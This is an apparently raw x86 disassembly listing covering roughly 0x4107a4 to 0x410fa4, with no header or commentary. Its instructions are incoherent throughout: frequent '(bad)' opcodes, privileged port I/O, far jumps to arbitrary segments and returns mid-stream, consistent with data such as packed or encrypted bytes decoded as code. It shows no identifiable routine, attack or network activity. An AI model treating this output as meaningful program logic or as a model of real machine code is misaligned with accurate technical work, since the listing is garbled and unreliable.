  4107a4:	xchg   ecx,eax
  4107a5:	xchg   edx,eax
  4107a6:	jle    0x410757
  4107a8:	rol    edi,cl
  4107aa:	jle    0x4107aa
  4107ac:	mov    al,ds:0x44a37e8b
  4107b1:	cmp    al,0xf8
  4107b3:	adc    eax,0xa7d0f646
  4107b8:	scas   al,BYTE PTR es:[edi]
  4107b9:	inc    ebp
  4107ba:	mov    dl,0xa4
  4107bc:	aad    0x8
  4107be:	les    edx,FWORD PTR [ecx-0x6e51d11d]
  4107c4:	popa   
  4107c5:	and    eax,0xbd1fd5bf
  4107ca:	mov    ebp,0x3fdc5ecb
  4107cf:	repnz aam 0x27
  4107d2:	pop    ebp
  4107d3:	mov    al,ds:0x1e7fca9e
  4107d8:	pop    ds
  4107d9:	dec    ebp
  4107da:	and    eax,0xd84dff0e
  4107df:	jmp    0x36c1:0x56643632
  4107e6:	(bad)  
  4107e7:	fs std 
  4107e9:	mov    BYTE PTR [ecx+eax*8+0x76],dh
  4107ed:	out    dx,al
  4107ee:	cs pop esi
  4107f0:	or     eax,0x5bc3ef2c
  4107f5:	lods   al,BYTE PTR ds:[esi]
  4107f6:	mov    dl,0xb3
  4107f8:	xor    ecx,DWORD PTR [ecx]
  4107fa:	aas    
  4107fb:	jge    0x410814
  4107fd:	add    esi,eax
  4107ff:	adc    eax,0x72da04d8
  410804:	push   es
  410805:	iret   
  410806:	mov    ds:0x4037728f,al
  41080b:	pop    edi
  41080c:	not    DWORD PTR [ebp+0x56fb29ce]
  410812:	leave  
  410813:	fisubr DWORD PTR [ecx-0x7b397fed]
  410819:	adc    dh,BYTE PTR [esp+esi*1-0x42]
  41081d:	call   0x59c0694
  410822:	xor    ch,BYTE PTR [ebp+0x50]
  410825:	out    dx,eax
  410826:	mov    esi,0x3beda152
  41082b:	ret    
  41082c:	sahf   
  41082d:	pop    ss
  41082e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41082f:	fidivr DWORD PTR [ebx+0x29f0f2ec]
  410835:	jbe    0x41086f
  410837:	xchg   esi,eax
  410838:	fs scas eax,DWORD PTR es:[edi]
  41083a:	adc    al,0x5e
  41083c:	jmp    0x7953c403
  410841:	push   cs
  410842:	fwait
  410843:	cmp    al,0x4b
  410845:	in     eax,0xc9
  410847:	mov    ebp,DWORD PTR [esi+0xc307a3e]
  41084d:	fist   WORD PTR [ebx+0x277c691f]
  410853:	mov    dl,0x6
  410855:	mov    dh,0xb8
  410857:	fs jno 0x410822
  41085a:	mov    ecx,0xb3fdf16
  41085f:	mov    al,ds:0x32fab339
  410864:	mov    esp,0x2179f559
  410869:	mov    edi,DWORD PTR [eax+0x27a9ac03]
  41086f:	and    al,BYTE PTR ds:0x61336c32
  410875:	int3   
  410876:	add    al,0xc4
  410878:	rcl    DWORD PTR [esi+0x77],1
  41087b:	inc    BYTE PTR [esp+edx*4-0x61945012]
  410882:	setg   BYTE PTR [ecx]
  410885:	xlat   BYTE PTR ds:[ebx]
  410886:	mov    ebp,0xe6e00505
  41088b:	imul   edx,DWORD PTR [edi],0x63
  41088e:	mov    dl,0x45
  410890:	xor    bh,dl
  410892:	sub    al,0x74
  410894:	inc    ecx
  410895:	sub    BYTE PTR [edx-0x1dfe1bea],cl
  41089b:	pop    es
  41089c:	mov    eax,0x897538e1
  4108a1:	lods   eax,DWORD PTR ds:[esi]
  4108a2:	in     al,dx
  4108a3:	adc    eax,DWORD PTR [edx+0x5f]
  4108a6:	jg     0x41082b
  4108a8:	xor    DWORD PTR [edi+0x40],0xbeb996ba
  4108af:	div    DWORD PTR [eax]
  4108b1:	jnp    0x41086c
  4108b3:	lds    eax,FWORD PTR [edx+0x4]
  4108b6:	inc    ecx
  4108b7:	mov    ecx,0x964c18
  4108bc:	xor    eax,esp
  4108be:	sbb    ah,BYTE PTR [edi-0x27f81cb4]
  4108c4:	retf   
  4108c5:	hlt    
  4108c6:	out    dx,eax
  4108c7:	xchg   ecx,eax
  4108c8:	mov    al,ds:0xd6112b88
  4108cd:	xchg   ebx,eax
  4108ce:	push   0xffffffe0
  4108d0:	sbb    cl,bh
  4108d2:	dec    edi
  4108d3:	pop    esp
  4108d4:	iret   
  4108d5:	push   ss
  4108d6:	push   eax
  4108d7:	test   eax,0x428f4b37
  4108dc:	push   ds
  4108dd:	imul   esi,DWORD PTR [edi-0x20],0x73
  4108e1:	pusha  
  4108e2:	int    0xb
  4108e4:	sub    eax,0x2f9b54b5
  4108e9:	(bad)  
  4108ea:	mov    esp,0x2a0b825d
  4108ef:	cmp    eax,0x7a3883de
  4108f4:	popa   
  4108f5:	(bad)  
  4108f6:	shl    BYTE PTR [edi-0x40dc79d1],0x9c
  4108fd:	clc    
  4108fe:	and    ecx,0x1fadb0e0
  410904:	pushf  
  410905:	sbb    bh,BYTE PTR [eax]
  410907:	in     eax,0xc5
  410909:	retf   0x40bc
  41090c:	out    0x6c,al
  41090e:	and    eax,0x17260bed
  410913:	in     eax,dx
  410914:	sbb    BYTE PTR [ecx-0x23694ab7],al
  41091a:	(bad)  
  41091b:	jecxz  0x410955
  41091d:	loope  0x41096f
  41091f:	leave  
  410920:	push   0xffffffc6
  410922:	(bad)  
  410923:	pushf  
  410924:	out    dx,al
  410925:	pop    ecx
  410926:	cmp    esp,ebp
  410928:	adc    ch,0x3b
  41092b:	jne    0x410993
  41092d:	pop    ebp
  41092e:	fisub  WORD PTR [edi+0x3d]
  410931:	dec    eax
  410932:	jb     0x4109a9
  410934:	iret   
  410935:	add    ecx,DWORD PTR [ebp+0x5]
  410938:	adc    al,0x6a
  41093a:	jb     0x4108ef
  41093c:	mov    eax,0x3581a02f
  410941:	push   esi
  410942:	jmp    0x7a7b:0x6e7a0fb0
  410949:	rcr    ch,0x48
  41094c:	and    DWORD PTR [esi-0x571d2e16],0x3a
  410953:	sub    eax,0x23dda3da
  410958:	and    ch,BYTE PTR [edx-0x55]
  41095b:	dec    ecx
  41095c:	aam    0xc2
  41095e:	test   BYTE PTR [eax-0x2],ch
  410961:	jmp    0x3c3db339
  410966:	push   edi
  410967:	mov    BYTE PTR [eax],bh
  410969:	gs add ah,ah
  41096c:	fst    QWORD PTR [edx+0x33f5301f]
  410972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410973:	stos   BYTE PTR es:[edi],al
  410974:	pop    ss
  410975:	and    DWORD PTR [ebx],ebp
  410977:	xchg   esp,eax
  410978:	and    esi,DWORD PTR [ebx-0x64]
  41097b:	mov    bh,0x63
  41097d:	add    BYTE PTR [edx],bh
  41097f:	jl     0x41091d
  410981:	add    eax,0x82aa1349
  410986:	jbe    0x4109f7
  410988:	fwait
  410989:	mov    cl,0xfa
  41098b:	rol    DWORD PTR [eax-0x56530bd2],cl
  410991:	aad    0x9e
  410993:	ds add eax,0x2f759b90
  410999:	out    0x5,eax
  41099b:	call   0xb5de:0x3ec4354b
  4109a2:	adc    edx,ebx
  4109a4:	xchg   edx,eax
  4109a5:	xchg   edx,eax
  4109a6:	lock inc esp
  4109a8:	lahf   
  4109a9:	and    BYTE PTR [ecx-0x74],bl
  4109ac:	mov    cl,0x7e
  4109ae:	jbe    0x41095e
  4109b0:	push   ds
  4109b1:	loop   0x410a03
  4109b3:	jmp    0xe61f:0x2ebfacdf
  4109ba:	int3   
  4109bb:	mov    ds:0xcfa111ac,eax
  4109c0:	daa    
  4109c1:	cmc    
  4109c2:	sub    al,0x63
  4109c4:	cmp    ah,BYTE PTR [ebx-0x5a]
  4109c7:	sbb    BYTE PTR [ecx+0x29],al
  4109ca:	lods   eax,DWORD PTR ds:[esi]
  4109cb:	sbb    DWORD PTR [esi+0x41],edi
  4109ce:	mov    DWORD PTR ds:0x71ddb50,esi
  4109d4:	push   ebx
  4109d5:	mov    bl,0xfe
  4109d7:	pop    ss
  4109d8:	mov    esp,0x970c1415
  4109dd:	(bad)  
  4109de:	or     al,0xb7
  4109e0:	lock arpl ax,cx
  4109e3:	rol    edx,cl
  4109e5:	or     BYTE PTR [ebp*8+0x2c151ed1],bh
  4109ec:	repnz xchg esp,eax
  4109ee:	outs   dx,DWORD PTR ds:[esi]
  4109ef:	shl    al,1
  4109f1:	das    
  4109f2:	cld    
  4109f3:	popa   
  4109f4:	(bad)  
  4109f5:	push   ebp
  4109f6:	(bad)  
  4109f8:	add    DWORD PTR [ebx-0x650d0c68],esp
  4109fe:	scas   al,BYTE PTR es:[edi]
  4109ff:	outs   dx,BYTE PTR ds:[esi]
  410a00:	(bad)  
  410a01:	jmp    0x4109b0
  410a03:	aaa    
  410a04:	xchg   BYTE PTR [eax+0x550b1e47],al
  410a0a:	jecxz  0x4109a8
  410a0c:	xchg   esp,eax
  410a0d:	mov    dh,BYTE PTR [ebp+edx*2+0x30]
  410a11:	sbb    BYTE PTR [ebx],0xce
  410a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a15:	xor    al,BYTE PTR [ecx]
  410a17:	call   0x4deb20a4
  410a1c:	push   edi
  410a1d:	ja     0x410a2e
  410a1f:	out    0xa1,al
  410a21:	aad    0x3c
  410a23:	call   0xf625d3a1
  410a28:	adc    eax,0x3245e87d
  410a2d:	leavew 
  410a2f:	mov    ds:0x4f47bc79,eax
  410a34:	push   edx
  410a35:	mov    esp,0x9210ec80
  410a3a:	in     eax,dx
  410a3b:	ret    0x1f39
  410a3e:	scas   al,BYTE PTR es:[edi]
  410a3f:	leave  
  410a40:	imul   edx,DWORD PTR [ebp+0x5428c8ba],0xe76c86a0
  410a4a:	xchg   ecx,eax
  410a4b:	pusha  
  410a4c:	(bad)  
  410a4e:	mov    dh,BYTE PTR [edi-0xce7de08]
  410a54:	mov    al,bl
  410a56:	test   eax,0xe1e000a1
  410a5b:	call   0x17ae:0x8c6590ad
  410a62:	lea    ebp,[edx+0x10554349]
  410a68:	hlt    
  410a69:	lods   al,BYTE PTR ds:[esi]
  410a6b:	loop   0x410a6b
  410a6d:	(bad)  
  410a6e:	mov    cl,0xd1
  410a70:	hlt    
  410a71:	pop    ds
  410a72:	pop    ecx
  410a73:	mov    ecx,0x4709504e
  410a78:	fdivr  st(3),st
  410a7a:	or     eax,0x5dcf8bdd
  410a7f:	fisttp DWORD PTR [eax-0x20]
  410a82:	pop    es
  410a83:	xchg   edx,eax
  410a84:	cli    
  410a85:	daa    
  410a86:	clc    
  410a87:	(bad)  
  410a88:	cwde   
  410a89:	call   0x1f7eaed6
  410a8e:	fnstcw WORD PTR [edi]
  410a90:	and    bl,BYTE PTR [ecx+0x5e]
  410a93:	jne    0x410a19
  410a95:	dec    esi
  410a96:	jb     0x410b05
  410a98:	mov    eax,0x43014073
  410a9d:	mov    edi,0x30e0e62b
  410aa2:	jmp    0x5aff08cd
  410aa7:	ffree  st(6)
  410aa9:	jo     0x410add
  410aab:	mov    cl,0x62
  410aad:	pop    ecx
  410aae:	in     al,dx
  410aaf:	mov    al,ds:0xe3c3495e
  410ab4:	outs   dx,BYTE PTR ds:[esi]
  410ab5:	std    
  410ab6:	bound  edx,QWORD PTR [ebp-0x23]
  410ab9:	out    dx,eax
  410aba:	push   edi
  410abb:	inc    edx
  410abc:	aad    0xd5
  410abe:	add    DWORD PTR [ecx],ebx
  410ac0:	lods   eax,DWORD PTR ds:[esi]
  410ac1:	fisttp WORD PTR [eax+0x1ea8fb6f]
  410ac7:	cli    
  410ac8:	cdq    
  410ac9:	and    DWORD PTR [ecx],esp
  410acb:	inc    ebx
  410acc:	sahf   
  410acd:	jle    0x410a66
  410acf:	adc    eax,0x8f85899a
  410ad4:	add    BYTE PTR [ecx+0x1fc33e13],0x3d
  410adb:	je     0x410b44
  410add:	cmp    dl,dh
  410adf:	lahf   
  410ae0:	xchg   edi,eax
  410ae1:	pushf  
  410ae2:	neg    DWORD PTR [ecx]
  410ae4:	mov    eax,DWORD PTR [ebp-0xf9f440f]
  410aea:	xchg   ecx,eax
  410aeb:	jl     0x410b4f
  410aed:	push   ebp
  410aee:	pop    ebp
  410aef:	sbb    cl,ah
  410af1:	pop    ecx
  410af2:	loop   0x410b52
  410af4:	fmul   DWORD PTR [ecx]
  410af6:	popa   
  410af7:	ds inc ebp
  410af9:	shl    DWORD PTR [edi],cl
  410afb:	popf   
  410afc:	cs dec ebx
  410afe:	push   ebx
  410aff:	or     ecx,0x22
  410b02:	inc    esp
  410b03:	pop    es
  410b04:	fs dec eax
  410b06:	(bad)  
  410b07:	adc    BYTE PTR [ecx+0x6901f9e5],ch
  410b0d:	cmp    eax,DWORD PTR [ebp-0x91266ba]
  410b13:	push   ecx
  410b14:	imul   DWORD PTR [edx-0x8]
  410b17:	push   eax
  410b18:	std    
  410b19:	dec    eax
  410b1a:	mov    bl,0xff
  410b1c:	xchg   edi,eax
  410b1d:	dec    ecx
  410b1e:	js     0x410b64
  410b20:	push   ecx
  410b21:	out    dx,al
  410b22:	mov    BYTE PTR [ecx-0x3],dl
  410b25:	dec    edi
  410b26:	xor    eax,0x19956d22
  410b2b:	mov    esi,0xc3ea2657
  410b30:	sub    ebx,DWORD PTR [edi-0x52]
  410b33:	test   al,0x3d
  410b35:	scas   eax,DWORD PTR es:[edi]
  410b36:	(bad)  
  410b37:	call   0xcac2:0xea25f2ea
  410b3e:	arpl   bp,cx
  410b40:	jp     0x410af8
  410b42:	ror    DWORD PTR [esi+ebx*2-0x605071f2],cl
  410b49:	sbb    dl,ah
  410b4b:	adc    dh,BYTE PTR [esi+ebp*1+0x4f6f6d57]
  410b52:	sub    BYTE PTR [ecx+0x45d5ecf0],ch
  410b58:	mul    DWORD PTR [edi]
  410b5a:	xor    dh,dl
  410b5c:	push   ebx
  410b5d:	scas   eax,DWORD PTR es:[edi]
  410b5e:	out    0x33,eax
  410b60:	leave  
  410b61:	xchg   esi,eax
  410b62:	mov    edx,0x435b2057
  410b67:	nop
  410b68:	xor    BYTE PTR [esp+edx*4],dl
  410b6b:	bound  edx,QWORD PTR [ebp+eax*1-0x27]
  410b6f:	and    eax,0xe59eb4a9
  410b74:	les    esp,FWORD PTR [ebp-0x14]
  410b77:	mov    DWORD PTR [eax+0x21034f27],ecx
  410b7d:	push   es
  410b7e:	push   esi
  410b7f:	stos   BYTE PTR es:[edi],al
  410b80:	ss icebp 
  410b82:	jecxz  0x410ba6
  410b84:	out    0x2,al
  410b86:	push   edi
  410b87:	push   edi
  410b88:	push   esp
  410b89:	dec    esi
  410b8a:	push   cs
  410b8b:	scas   eax,DWORD PTR es:[edi]
  410b8c:	repz push esp
  410b8e:	push   edx
  410b8f:	mov    WORD PTR [ecx],gs
  410b91:	sub    esp,DWORD PTR [edi+eax*4-0x392d65e0]
  410b98:	retf   
  410b99:	sub    al,0x5f
  410b9b:	ds dec edx
  410b9d:	jg     0x410b68
  410b9f:	jbe    0x410b2b
  410ba1:	sbb    esp,DWORD PTR [edx]
  410ba3:	(bad)  
  410ba5:	xchg   esi,eax
  410ba6:	add    BYTE PTR [edi-0x1f04c769],0xc5
  410bad:	in     eax,0x7e
  410baf:	inc    DWORD PTR [edi+ebx*2-0x422a676a]
  410bb6:	jns    0x410bd9
  410bb8:	inc    ecx
  410bb9:	mov    al,ds:0x81ae96cb
  410bbe:	aas    
  410bbf:	push   edi
  410bc0:	cdq    
  410bc1:	aaa    
  410bc2:	inc    BYTE PTR [edx-0x27]
  410bc5:	push   edi
  410bc6:	xchg   edi,eax
  410bc7:	out    dx,al
  410bc8:	mov    BYTE PTR [edx],bh
  410bca:	add    DWORD PTR [eax+0x1f0f4043],0x2e5ed9da
  410bd4:	pushf  
  410bd5:	call   0xa405eefe
  410bda:	mov    ebx,0x493f9d59
  410bdf:	gs push ebx
  410be1:	adc    DWORD PTR [esp+eiz*8],esi
  410be4:	pop    ebx
  410be5:	lods   al,BYTE PTR ds:[esi]
  410be6:	pop    esi
  410be7:	lds    eax,FWORD PTR fs:[ebx]
  410bea:	sar    BYTE PTR [edi+ebx*1+0x7507bb04],0x7f
  410bf2:	jg     0x410bc1
  410bf4:	and    al,0x7e
  410bf6:	adc    al,0x10
  410bf8:	(bad)  
  410bf9:	mov    DWORD PTR gs:[ecx+eiz*2-0x3fc24b39],eax
  410c01:	mov    cl,BYTE PTR [ecx-0x236f307b]
  410c07:	jns    0x410c3d
  410c09:	iret   
  410c0a:	push   edi
  410c0b:	(bad)  
  410c0c:	out    dx,eax
  410c0d:	loopne 0x410c62
  410c0f:	into   
  410c10:	or     eax,0x9bbe09c3
  410c15:	dec    eax
  410c16:	and    bl,BYTE PTR [edi+eiz*8-0x7]
  410c1a:	inc    esi
  410c1b:	adc    ecx,ebp
  410c1d:	(bad)  
  410c1e:	loopne 0x410c51
  410c20:	iret   
  410c21:	addr16 in eax,0xa2
  410c24:	xor    al,0x2a
  410c26:	test   DWORD PTR [ebp+0x58],ebp
  410c29:	pusha  
  410c2a:	cmp    al,0x73
  410c2c:	pop    ss
  410c2d:	pop    ecx
  410c2e:	inc    esp
  410c2f:	add    BYTE PTR [edi-0x1657bd2d],bl
  410c35:	ins    BYTE PTR es:[edi],dx
  410c36:	jmp    0x95f8:0x7efee9f2
  410c3d:	test   DWORD PTR [edi-0x57243920],0x1bab70b9
  410c47:	stos   BYTE PTR es:[edi],al
  410c48:	out    dx,al
  410c49:	mov    al,ds:0x5c676cd7
  410c4e:	cdq    
  410c4f:	jl     0x410c11
  410c51:	daa    
  410c52:	arpl   WORD PTR [edx-0x35],bx
  410c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c56:	inc    ecx
  410c57:	ins    BYTE PTR es:[edi],dx
  410c58:	inc    esp
  410c59:	retf   0x7862
  410c5c:	sub    eax,0xee1b9988
  410c61:	adc    bh,BYTE PTR [eax-0x57]
  410c64:	leave  
  410c65:	rcr    ecx,1
  410c67:	in     al,0x2f
  410c69:	push   0x5dba09a7
  410c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6f:	mov    bh,0xd
  410c71:	adc    ebx,DWORD PTR [esp+eiz*2-0x130abe6d]
  410c78:	ret    
  410c79:	mov    WORD PTR [edx+0x4f9bf92a],?
  410c7f:	out    0x74,al
  410c81:	or     ah,BYTE PTR [ebx]
  410c83:	outs   dx,DWORD PTR ds:[esi]
  410c84:	adc    eax,0x18f617af
  410c89:	in     eax,dx
  410c8a:	fs cli 
  410c8c:	and    al,0xeb
  410c8e:	sbb    al,0x9
  410c90:	iret   
  410c91:	int    0x31
  410c93:	es push ecx
  410c95:	jne    0x410cf7
  410c97:	and    al,0xc6
  410c99:	jne    0x410cbc
  410c9b:	sub    ebp,ebp
  410c9d:	mov    ebp,0xc65204a5
  410ca2:	test   BYTE PTR [edi+0x5fdde110],bl
  410ca8:	mov    eax,0x5c2f3ab9
  410cad:	sbb    edi,DWORD PTR [esi-0x45]
  410cb0:	pop    esp
  410cb1:	mov    dh,0x33
  410cb3:	inc    eax
  410cb4:	pushf  
  410cb5:	mov    eax,edx
  410cb7:	jge    0x410c46
  410cb9:	push   ss
  410cba:	inc    eax
  410cbb:	mov    dl,0xc5
  410cbd:	cs scas al,BYTE PTR es:[edi]
  410cbf:	clc    
  410cc0:	mov    eax,0xd6b2e938
  410cc5:	jnp    0x410d44
  410cc7:	adc    BYTE PTR [edi+0x33],al
  410cca:	scas   al,BYTE PTR es:[edi]
  410ccb:	aas    
  410ccc:	sbb    eax,0xda0feb77
  410cd1:	sub    BYTE PTR [ebp-0x7d],ch
  410cd4:	outs   dx,DWORD PTR ds:[si]
  410cd6:	les    edx,FWORD PTR es:[edi+0xb17a323]
  410cdd:	int3   
  410cde:	stc    
  410cdf:	cmp    ecx,DWORD PTR [eax]
  410ce1:	xchg   DWORD PTR [edi+ebp*4],eax
  410ce4:	ret    
  410ce5:	inc    ebx
  410ce6:	pop    es
  410ce7:	sub    BYTE PTR [esi-0x4cdc0602],0x59
  410cee:	in     eax,dx
  410cef:	dec    eax
  410cf0:	data16 add BYTE PTR [ebp+0x24],bl
  410cf4:	leave  
  410cf5:	retf   
  410cf6:	sub    DWORD PTR [edx-0x5920f515],esi
  410cfc:	pop    eax
  410cfd:	std    
  410cfe:	dec    esp
  410cff:	pop    ebx
  410d00:	pop    ss
  410d01:	mov    eax,0x18a99c9
  410d06:	xlat   BYTE PTR ds:[ebx]
  410d07:	add    al,0xed
  410d09:	out    dx,al
  410d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d0b:	ins    DWORD PTR es:[edi],dx
  410d0c:	popf   
  410d0d:	repz not DWORD PTR [esi+0x42]
  410d11:	dec    esp
  410d12:	push   cs
  410d13:	ja     0x410ce6
  410d15:	or     esi,DWORD PTR [ecx+0x19]
  410d18:	and    eax,0x54d8699c
  410d1d:	add    DWORD PTR [esi-0x4dfa854c],ebp
  410d23:	and    eax,0x2efe7ada
  410d28:	adc    esp,ebx
  410d2a:	cmp    BYTE PTR [edx+0x8],bh
  410d2d:	sti    
  410d2e:	loop   0x410d15
  410d30:	ret    
  410d31:	les    edi,FWORD PTR [esi+0x7abb1814]
  410d37:	ss dec ebx
  410d39:	inc    eax
  410d3a:	sub    DWORD PTR [ebx-0x42],esi
  410d3d:	jmp    0xfc817e6c
  410d42:	test   BYTE PTR [eax-0x52],al
  410d45:	xor    BYTE PTR [esi],dh
  410d47:	cs xchg esp,eax
  410d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d4a:	fcom   st(4)
  410d4c:	imul   dx,WORD PTR [esi-0x3b490743],0x9904
  410d55:	sub    al,0x2e
  410d57:	(bad)  
  410d58:	(bad)  
  410d5a:	scas   eax,DWORD PTR es:[edi]
  410d5b:	xor    cl,BYTE PTR [eax+0x448b7ca4]
  410d61:	jp     0x410dab
  410d63:	add    ch,al
  410d65:	cmc    
  410d66:	and    bh,al
  410d68:	and    eax,DWORD PTR [esi+0x2f49a12e]
  410d6e:	mov    ds:0x2ef49f72,eax
  410d73:	xor    bh,BYTE PTR [edx+0x6d58226e]
  410d79:	out    0xa7,eax
  410d7b:	and    al,0xf4
  410d7d:	sbb    al,0xe9
  410d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d80:	xchg   esp,eax
  410d81:	inc    esp
  410d82:	aaa    
  410d83:	mov    al,ds:0x2c02c106
  410d88:	mov    dl,0x1e
  410d8a:	xchg   edx,eax
  410d8b:	jmp    0x410d95
  410d8d:	mov    edi,0xd9e80c59
  410d92:	paddw  mm3,mm0
  410d95:	sub    BYTE PTR [edi+0x24],bl
  410d98:	add    DWORD PTR [esi-0x681c4487],ecx
  410d9e:	lahf   
  410d9f:	xchg   ebx,eax
  410da0:	adc    DWORD PTR [ecx-0x12111e2f],esi
  410da6:	ss pop ss
  410da8:	sub    esp,ecx
  410daa:	or     BYTE PTR [eax],ch
  410dac:	sub    dl,BYTE PTR [ecx-0x10]
  410daf:	jmp    0x410d4a
  410db1:	jl     0x410d47
  410db3:	or     al,0xdb
  410db5:	xor    DWORD PTR [esi-0xa18e7a0],edx
  410dbb:	fnstenv [edx+0x4932f4f3]
  410dc1:	push   ecx
  410dc2:	je     0x410d9d
  410dc4:	je     0x410e33
  410dc6:	shr    DWORD PTR ds:0xd6f2d690,0xe3
  410dcd:	js     0x410d8e
  410dcf:	cmp    al,0xa1
  410dd1:	por    mm0,QWORD PTR [ebx]
  410dd4:	jmp    0x410d85
  410dd6:	(bad)  
  410dd7:	jecxz  0x410de6
  410dd9:	into   
  410dda:	mov    esp,0x4bff1ad5
  410ddf:	enter  0xbf2d,0x2f
  410de3:	pop    ds
  410de4:	(bad)  
  410de5:	xor    cl,BYTE PTR [ebx+0x34]
  410de8:	js     0x410e28
  410dea:	jb     0x410e63
  410dec:	jne    0x410dae
  410dee:	jnp    0x410d74
  410df0:	push   0xfab24ae7
  410df5:	das    
  410df6:	(bad)  [ebx+0x4161afe8]
  410dfc:	sub    BYTE PTR ds:0xd12548bd,dh
  410e02:	fs sub al,0x95
  410e05:	shl    DWORD PTR [ecx-0x33],0x4c
  410e09:	jne    0x410e30
  410e0b:	shl    bl,1
  410e0d:	sbb    dh,BYTE PTR [ecx]
  410e0f:	xor    BYTE PTR [ecx],ah
  410e11:	push   es
  410e12:	inc    edx
  410e13:	jl     0x410e3e
  410e15:	jp     0x410e67
  410e17:	xor    al,BYTE PTR [ecx-0x55dbc83a]
  410e1d:	fmul   QWORD PTR [ebp-0x737ed414]
  410e23:	ror    DWORD PTR [esi+0x16],0x31
  410e27:	mov    al,0xaa
  410e29:	sbb    DWORD PTR [ebp-0xf24c55b],esp
  410e2f:	mov    ecx,0xcaa84e44
  410e34:	or     dl,BYTE PTR [esi-0x4]
  410e37:	outs   dx,DWORD PTR ds:[esi]
  410e38:	in     al,dx
  410e39:	imul   DWORD PTR [ebp-0x20]
  410e3c:	sbb    al,0x9d
  410e3e:	test   BYTE PTR [ebx+0x7],cl
  410e41:	fwait
  410e42:	mov    esp,DWORD PTR [esi]
  410e44:	popf   
  410e45:	test   BYTE PTR [ebx+eax*4-0x1f03099a],ch
  410e4c:	or     al,0xa9
  410e4e:	sub    BYTE PTR [ebp-0x1bbf2e8f],dh
  410e54:	ja     0x410dd6
  410e56:	add    al,0x2e
  410e58:	fbstp  TBYTE PTR [ebp+0x7]
  410e5b:	hlt    
  410e5c:	mov    ds:0x4621ab56,eax
  410e61:	or     DWORD PTR [esi],edi
  410e63:	jno    0x410e8a
  410e65:	mov    BYTE PTR [edi],al
  410e67:	pop    ds
  410e68:	push   esp
  410e69:	ss aam 0xeb
  410e6c:	data16 mov fs,WORD PTR [esi]
  410e6f:	jl     0x410e5d
  410e71:	out    0xc6,al
  410e73:	xchg   edi,eax
  410e74:	stc    
  410e75:	cwde   
  410e76:	enter  0x8720,0xa5
  410e7a:	inc    eax
  410e7b:	jmp    0x4cae:0x4f5ab024
  410e82:	fadd   QWORD PTR [ecx+0x70]
  410e85:	cli    
  410e86:	inc    eax
  410e87:	neg    DWORD PTR [ecx]
  410e89:	retf   
  410e8a:	xchg   ebp,eax
  410e8b:	fsub   st,st(4)
  410e8d:	sbb    edi,DWORD PTR [ebx]
  410e8f:	add    BYTE PTR [edi+0x319a868a],0x50
  410e96:	adc    edi,ebp
  410e98:	jbe    0x410e86
  410e9a:	xor    al,0x44
  410e9c:	xor    eax,edx
  410e9e:	add    edi,DWORD PTR [ecx-0x6541bee]
  410ea4:	call   0xe5974dec
  410ea9:	lds    esi,FWORD PTR [ebp+ebp*2+0x70]
  410ead:	push   cs
  410eae:	and    DWORD PTR [edi-0x46],ebx
  410eb1:	xchg   DWORD PTR [eax+esi*8-0x18b13a23],esi
  410eb8:	sbb    BYTE PTR [ecx+eiz*2-0xb],dh
  410ebc:	jnp    0x410ebf
  410ebe:	je     0x410ebf
  410ec0:	inc    ecx
  410ec1:	outs   dx,BYTE PTR ds:[esi]
  410ec2:	xor    edi,DWORD PTR [edi+ecx*1+0x2c2f1940]
  410ec9:	mov    DWORD PTR [ebp-0x271e2f5a],ebx
  410ecf:	call   0xb325:0x4db35e88
  410ed6:	scas   eax,DWORD PTR es:[edi]
  410ed7:	jecxz  0x410ed8
  410ed9:	jmp    0x410ead
  410edb:	cdq    
  410edc:	xchg   BYTE PTR [edx-0x132cb504],al
  410ee2:	js     0x410e6f
  410ee4:	jle    0x410ee6
  410ee6:	dec    eax
  410ee7:	push   ebp
  410ee8:	mov    ebx,DWORD PTR [eax+0x4c347211]
  410eee:	inc    eax
  410eef:	jns    0x410ec3
  410ef1:	adc    al,0x15
  410ef3:	dec    ecx
  410ef4:	retf   0x72a4
  410ef7:	imul   ebp,DWORD PTR [ebx-0x521fc82c],0x9
  410efe:	xor    edx,esp
  410f00:	stos   BYTE PTR es:[edi],al
  410f01:	lock fld st(2)
  410f04:	div    DWORD PTR ds:0xaa847c72
  410f0a:	sub    BYTE PTR [ecx+0x30aaa123],dh
  410f10:	jno    0x410f4a
  410f12:	add    bl,BYTE PTR [ebp+0x78]
  410f15:	ja     0x410f1f
  410f17:	sub    bl,BYTE PTR [ebx+0x543978b8]
  410f1d:	icebp  
  410f1e:	imul   ebp,DWORD PTR [ecx+0x39],0xf
  410f22:	cmp    DWORD PTR [esi+0x5a5206a3],ecx
  410f28:	sbb    al,0xbe
  410f2a:	push   0x31da1c85
  410f2f:	xchg   dl,ah
  410f31:	mov    ah,0x98
  410f33:	mov    DWORD PTR [eax+0x4b],eax
  410f36:	hlt    
  410f37:	daa    
  410f38:	shl    ebp,1
  410f3a:	sub    eax,0x9d83ef5
  410f3f:	mov    edx,0xb196d99f
  410f44:	mov    BYTE PTR [edi-0x36097a6],dh
  410f4a:	mov    edi,0x6a883e6b
  410f4f:	(bad)  
  410f50:	and    eax,0xb9f2243d
  410f55:	mov    DWORD PTR [eax+0x13003d7c],esp
  410f5b:	inc    ecx
  410f5c:	test   ebx,eax
  410f5e:	mov    edi,0xae72e99d
  410f63:	mov    esi,0x8346d041
  410f68:	xor    eax,0xf499200a
  410f6d:	mov    eax,0x1f36eb89
  410f72:	inc    esi
  410f73:	mov    cl,0xe0
  410f75:	push   edx
  410f76:	sub    BYTE PTR [eax-0x5c4e168e],dh
  410f7c:	jb     0x410f80
  410f7e:	or     eax,0x3291f538
  410f83:	add    bl,al
  410f85:	push   esp
  410f86:	and    dh,BYTE PTR [esi+0x4e2d05b2]
  410f8c:	in     eax,0xc2
  410f8e:	adc    ecx,ebx
  410f90:	xchg   esp,eax
  410f91:	aad    0x33
  410f93:	int    0x68
  410f95:	push   eax
  410f96:	add    eax,0xe9e7d28e
  410f9b:	inc    esp
  410f9c:	sbb    BYTE PTR [esi],0x69
  410f9f:	loopne 0x410fb1
  410fa1:	and    ecx,DWORD PTR [esi]
  410fa3:	lods   al,BYTE PTR ds:[esi]
  410fa4:	jl     0x410ff6
